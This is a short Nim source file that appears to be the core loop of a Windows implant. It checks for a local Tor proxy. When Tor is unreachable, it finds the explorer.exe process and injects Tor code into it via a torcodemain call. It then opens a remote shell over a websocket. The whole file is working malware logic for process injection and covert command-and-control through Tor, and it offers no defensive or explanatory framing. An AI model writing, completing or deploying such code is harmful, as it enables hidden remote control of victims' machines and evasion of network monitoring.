import ./lib/curl
import ./lib/functions
import os
import std/strutils
# var is_registered=websocket_request_init()
# if is_registered == 1:
#     echo "websocket_request_init() failed"
#     quit(1)
# else:
#     echo "websocket_request_init() success"

var has_already_injected = 0
while true:
    sleep 1000
    var resp = get_request("http://localhost:9050")
    if resp == "":
        echo "[!] Could not reach tor"
        if has_already_injected == 0:
            echo "[*] Injecting "
            var explorer_pid: int = get_pid_by_name("explorer.exe")
            echo "[*] Found explorer.exe PID: " & explorer_pid.intToStr()
            has_already_injected = 1
            torcodemain(explorer_pid)
    else:
        echo "[*] Successfully reached tor, continuing...."
        break
var shell=websocket_request_init_shell()
